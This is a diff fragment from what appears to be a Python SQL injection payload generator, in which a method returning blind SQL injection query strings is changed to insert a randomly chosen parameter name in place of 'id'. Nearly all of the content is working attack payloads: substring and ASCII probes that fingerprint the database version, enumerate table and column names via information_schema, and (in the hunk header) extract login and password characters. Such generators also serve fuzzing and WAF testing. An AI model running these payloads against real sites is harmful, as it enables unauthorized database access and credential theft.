@@ -38,13 +38,13 @@ AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
     @staticmethod
     def sub_string_sql_inj(column=choice(columns)):
         payload = f"""
-?id=1 and substring(version(),1,1)=5
-?id=1 and right(left(version(),1),1)=5
-?id=1 and left(version(),1)=4
-?id=1 and ascii(lower(substr(Version(),1,1)))=51
-?id=1 and (select mid(version(),1,1)=4)
-?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
-?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
+?{column}=1 and substring(version(),1,1)=5
+?{column}=1 and right(left(version(),1),1)=5
+?{column}=1 and left(version(),1)=4
+?{column}=1 and ascii(lower(substr(Version(),1,1)))=51
+?{column}=1 and (select mid(version(),1,1)=4)
+?{column}=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
+?{column}=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
  """
         retval = payload
         return retval
